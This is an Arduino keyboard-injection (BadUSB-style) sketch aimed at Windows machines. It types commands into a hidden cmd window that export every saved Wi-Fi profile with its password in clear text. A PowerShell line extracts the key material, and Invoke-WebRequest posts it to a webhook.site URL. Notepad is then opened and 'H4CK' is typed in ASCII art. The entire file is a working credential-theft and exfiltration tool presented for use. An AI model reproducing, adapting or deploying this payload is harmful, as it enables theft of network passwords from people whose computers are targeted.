#include <Keyboard.h> 

void setup() {
  Keyboard.begin();

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd /k mode con: cols=15 lines=1");
  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("cd %temp%");
  typeKey(KEY_RETURN);
  
    delay(200);
  
   Keyboard.print("netsh wlan export profile key=clear");
  typeKey(KEY_RETURN);
  
    delay(200);
  
  Keyboard.print("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
  typeKey(KEY_RETURN);
  
    delay(200);
  
 Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/put your webhooks here -Method POST -InFile Wi-Fi-PASS");
  typeKey(KEY_RETURN);
  
    delay(800);


  Keyboard.print("exit");
  typeKey(KEY_RETURN);

    delay(200);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

   delay(200);
  
Keyboard.print("notepad");
  typeKey(KEY_RETURN);

  delay(200);
  
   Keyboard.print("88  88   dP88   dP''b8 88  dP ");
     typeKey(KEY_RETURN);
    delay(200);
  
   Keyboard.print("88  88  dP 88  dP   `' 88odP  ");
     typeKey(KEY_RETURN);
       delay(200);
  
   Keyboard.print("888888 d888888 Yb      88'Yb  ");
     typeKey(KEY_RETURN);
       delay(200);
  
   Keyboard.print("88  88     88   YboodP 88  Yb ");
     typeKey(KEY_RETURN);
      delay(200);

    
;Keyboard.releaseAll();

  delay(800);

  
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void loop() {}
